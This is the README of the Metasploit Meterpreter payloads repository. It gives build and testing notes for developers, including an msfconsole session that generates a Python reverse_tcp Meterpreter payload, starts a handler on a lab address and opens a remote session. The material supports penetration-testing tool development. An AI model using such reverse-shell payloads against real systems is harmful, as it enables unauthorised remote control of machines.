metasploit-payloads
===================

Appveyor build status: [![Build Status](https://ci.appveyor.com/api/projects/status/github/rapid7/metasploit-payloads)](https://ci.appveyor.com/project/appveyor-r7/metasploit-payloads)

This is a unified repository for different Metasploit Framework payloads, which merges these repositories:

 * [C Windows Meterpreter][csource]
 * [Java and Android Meterpreter and Payloads][javasource]
 * [Python and PHP Meterpreter][frameworksource]

An alternate cross-platform C Meterpreter, called Mettle, is developed at https://github.com/rapid7/mettle

See the individual directories for meterpreter-specific README, build instructions and license details:

 * [C Windows/Linux Meterpreters][creadme]
 * [Java/Android Meterpreters and Payloads][javareadme]

For Python and PHP Meterpreter, you can test changes to these files by symlinking the associated files to `~/.msf4/payloads/meterpreter`.
As an example, here is how this might look like for a Python Meterpreter edit:

```bash
mkdir ~/.msf4/payloads # If this doesn't exist already
cd ~/git/metasploit-payloads
ln -s /home/gwillcox/git/metasploit-payloads/python/meterpreter/ext_server_stdapi.py /home/gwillcox/.msf4/payloads/meterpreter/ext_server_stdapi.py
file ~/.msf4/payloads/meterpreter/ext_server_stdapi.py
       /home/gwillcox/.msf4/payloads/meterpreter/ext_server_stdapi.py: symbolic link to /home/gwillcox/git/metasploit-payloads/python/meterpreter/ext_server_stdapi.py
```

If things went right you should see a warning message when selecting one of the corresponding Meterpreter payloads and recieving a session:

```
msf6 > use payload/python/meterpreter/reverse_tcp
msf6 payload(python/meterpreter/reverse_tcp) > set LHOST 192.168.153.128
LHOST => 192.168.153.128
msf6 payload(python/meterpreter/reverse_tcp) > generate -f raw -o reverse.py
[*] Writing 436 bytes to reverse.py...
msf6 payload(python/meterpreter/reverse_tcp) > to_handler
[*] Payload Handler Started as Job 0

[*] Started reverse TCP handler on 192.168.153.128:4444 
msf6 payload(python/meterpreter/reverse_tcp) > WARNING: Local file /home/gwillcox/.msf4/payloads/meterpreter/meterpreter.py is being used
WARNING: Local files may be incompatible with the Metasploit Framework
[*] Sending stage (24380 bytes) to 192.168.153.1
WARNING: Local file /home/gwillcox/.msf4/payloads/meterpreter/ext_server_stdapi.py is being used
[*] Meterpreter session 1 opened (192.168.153.128:4444 -> 192.168.153.1:50334) at 2022-12-13 12:49:49 -0600
```

  [csource]: https://github.com/rapid7/meterpreter
  [creadme]: https://github.com/rapid7/metasploit-payloads/tree/master/c/meterpreter
  [javasource]: https://github.com/rapid7/metasploit-javapayload
  [javareadme]: https://github.com/rapid7/metasploit-payloads/tree/master/java
  [frameworksource]: https://github.com/rapid7/metasploit-framework/tree/master/data/meterpreter
  [build_icon_windows]: https://ci.metasploit.com/buildStatus/icon?job=MeterpreterWin
  [build_icon_posix]: https://travis-ci.org/rapid7/meterpreter.png?branch=master
